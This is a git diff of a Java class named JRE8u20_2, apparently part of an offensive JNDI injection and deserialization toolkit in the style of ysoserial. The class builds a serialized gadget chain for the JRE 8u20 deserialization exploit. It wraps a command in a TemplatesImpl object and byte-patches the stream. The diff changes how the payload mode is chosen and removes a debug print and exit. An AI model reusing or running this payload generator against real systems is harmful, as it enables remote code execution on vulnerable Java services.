@@ -15,6 +15,7 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 public class  JRE8u20_2 implements ObjectPayload<Object> {
@@ -33,7 +34,7 @@ public class  JRE8u20_2 implements ObjectPayload<Object> {
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templates;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templates = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templates = Gadgets.createTemplatesImpl(type, param);
@@ -71,11 +72,6 @@ public class  JRE8u20_2 implements ObjectPayload<Object> {
         ser = ByteUtil.deleteAt(ser, i); // delete 0x78
         ser = ByteUtil.deleteAt(ser, i); // delete 0x70
 
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        baos.write(ser);
-
-        System.out.println(baos);
-        System.exit(0);
         return ser;
     }
 }
